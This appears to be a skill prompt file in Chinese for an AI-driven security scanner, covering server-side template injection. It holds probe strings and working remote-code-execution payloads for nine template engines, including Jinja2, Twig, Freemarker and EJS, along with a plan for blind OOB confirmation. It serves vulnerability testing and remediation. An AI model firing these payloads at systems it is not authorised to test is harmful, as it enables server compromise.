---
name: 'SSTI 模板注入分析'
icon: '🎨'
description: '当请求参数或字段可能被服务端模板引擎渲染时启用。典型信号：参数名含 template / content / body / message / comment / name / title / desc / markdown / html；Content-Type 含 text/html；URL 出现在邮件模板、PDF 生成、报表导出、wiki / 笔记 / 评论 / 工单 / 公告 / 个人简介等可被用户编辑的字段。不适用：纯 API JSON 接口（即便 body 是 HTML 也只是字符串不会渲染）、前端 Vue/React 客户端模板（那是 DOM XSS 不是 SSTI）。'
findingType: 'ssti'
---

本技能专注于服务端模板注入（SSTI）——用户输入被拼进模板字符串而非数据，导致 Jinja2 / Twig / Freemarker / Velocity / ERB / Smarty / Thymeleaf / Handlebars / EJS / Pug 等引擎执行任意代码。在你识别到模板渲染场景时，按以下流程处理：
1. 识别模板引擎指纹：响应头 X-Powered-By、错误页里的 "Jinja2" / "Twig" / "Freemarker" / "Velocity" / "Smarty"、404/500 报错的栈信息、`<%= ... %>` 风格的默认错误页。
2. 探测判活：发 {{7*7}} / ${7*7} / <%= 7*7 %> / #{7*7} / [[7*7]] 看响应里是否回 49 / 49 / 49 / 49 / 49。
3. 按引擎选 RCE payload：
   - Jinja2 (Flask/Django)：{{ ''.__class__.__mro__[1].__subclasses__() }} → 找 os._wrap_close 或 subprocess.Popen；或 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}；
   - Twig (Symfony)：{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ 'id' | filter('system') }}；
   - Freemarker (Java)：<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}；
   - Velocity (Java)：#set($x='')## $x.class.forName('java.lang.Runtime').getRuntime().exec('id')；
   - ERB (Rails)：<%= system('id') %>；
   - Smarty (PHP)：{system('id')} 或 `{php}system('id');{/php}`；
   - EJS (Node)：<%- global.process.mainModule.require('child_process').execSync('id') %>；
   - Pug：#{global.process.mainModule.require('child_process').execSync('id')}；
   - Thymeleaf (Spring)：__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x（SpEL 联动）。
4. 给出修复建议：模板只接受数据，禁用用户输入进模板字符串；用 sandboxed template（受限 API）；白名单字符；前后端分离（前端 React/Vue 渲染，不走服务端模板）。
所有由本技能产出的 finding 必须设置 type=ssti。多个技能可能同时被激活，本技能不负责 XSS（反射 / 存储 / DOM XSS 那 3 个都是前端视角）/ SQL 注入 / SSRF / 命令注入（拿到执行入口后也是 command-injection 视角）/ 反序列化等类型的发现。
【重放建议】SSTI 的判活很快但 RCE payload 因引擎而异，3 次硬上限（orchestrator 管控）按：
- 第 1 次：发 {{7*7}} / ${7*7} 探模板引擎；
- 第 2 次：按指纹选 1 个最简 RCE payload（先选无回显的命令 → OOB 回调，或写文件 + 另一条请求读）；
- 第 3 次：精调 payload 拿命令回显。
盲打场景用 OOB（interactsh / dnslog）确认是否真执行了，避免在目标留痕。response 里看到 49 是 SSTI 判活，看到 id 命令输出或 OOB 命中给 critical。本技能是"分析建议"而非"硬性规则"，最终判断权交给模型。
- 【反误报】给 finding 设 confidence 时，只在能解释清楚"为什么 ≥ 60" 时给 ≥60；判不成立 / 仅残留小概率不确定性（如 5%–20%）的疑似不要写进 findings——本插件解析阶段会再过一道阈值（约 30）兜底，但 prompt 层的克制才是从源头减少问题列表噪声 finding 的关键。
